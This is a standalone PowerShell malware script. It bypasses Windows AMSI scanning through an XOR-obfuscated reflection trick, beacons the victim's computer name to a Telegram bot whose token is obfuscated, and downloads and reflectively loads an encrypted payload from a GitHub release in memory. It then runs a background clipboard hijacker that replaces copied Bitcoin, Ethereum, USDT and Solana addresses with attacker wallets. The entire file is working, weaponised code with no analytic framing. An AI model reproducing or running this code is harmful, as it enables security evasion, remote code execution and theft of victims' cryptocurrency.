$k = 0xCC; [byte[]]$p = 137,151,157,158,151,147,192,135,155,152,151,157,151,155,151,152,134,192,143,131,134,153,155,151,134,151,157,151,152,192,143,155,137,151,123,134,151,158,137
$n = ""; foreach($b in $p){$n += [char]($b -bxor $k)}
[Ref].Assembly.GetType($n).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

function Send-Ping {
    param($m)
    $k=0xAF; [byte[]]$t_e=60,56,60,57,57,58,49,60,60,50,119,6,6,106,108,6,121,115,125,108,5,121,105,6,116,106,6,60,106,122,60,105,121,111,113,111,108,6,103,5,60,114,118; [byte[]]$c_e=54,53,61,61,51,54,56,43,50,53
    $t=""; foreach($b in $t_e){$t+=[char]($b -bxor $k)}; $c=""; foreach($b in $c_e){$c+=[char]($b -bxor $k)}
    $url = "h"+"tt"+"ps://api.tele"+"gram.org/bot$t/send"+"Message?chat_id=$c&text=$m"
    try { (New-Object Net.WebClient).DownloadString($url) | Out-Null } catch {}
}

Send-Ping -m "V32_3_GHOST_START_$($env:COMPUTERNAME)"

try {
    $h = New-Object System.Net.Http.HttpClient
    $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
    $raw = $h.GetStringAsync($url).Result
    $data = [Convert]::FromBase64String($raw.Trim())
    for($i=0; $i -lt $data.count; $i++){ $data[$i] = $data[$i] -bxor 0xAB }
    
    $rt = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.FullName -match 'mscorlib' }
    $mt = $rt.GetType('System.Reflection.Assembly').GetMethods() | Where-Object { $_.Name -eq 'Load' -and $_.GetParameters().Count -eq 1 }
    $asm = $mt.Invoke($null, @(,$data))
    $asm.EntryPoint.Invoke($null, @(,[string[]]@()))

    $C = {
        Add-Type -AssemblyName System.Windows.Forms
        $w = @{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}
        while(1){
            try {
                if([System.Windows.Forms.Clipboard]::ContainsText()){
                    $v = [System.Windows.Forms.Clipboard]::GetText().Trim()
                    if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$"){ if($v -ne $w.btc){[System.Windows.Forms.Clipboard]::SetText($w.btc)}}
                    elseif($v -match "^0x[a-fA-F0-9]{40}$"){ if($v -ne $w.eth){[System.Windows.Forms.Clipboard]::SetText($w.eth)}}
                    elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$"){ if($v -ne $w.usdt){[System.Windows.Forms.Clipboard]::SetText($w.usdt)}}
                    elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$"){ if($v -ne $w.sol){[System.Windows.Forms.Clipboard]::SetText($w.sol)}}
                }
            } catch {}
            [System.Threading.Thread]::Sleep(500)
        }
    }
    [PowerShell]::Create().AddScript($C).BeginInvoke()
    Send-Ping -m "V32_3_SUCCESS_IN_RAM"
} catch {
    Send-Ping -m "V32_3_ERR: $($_.Exception.Message)"
}
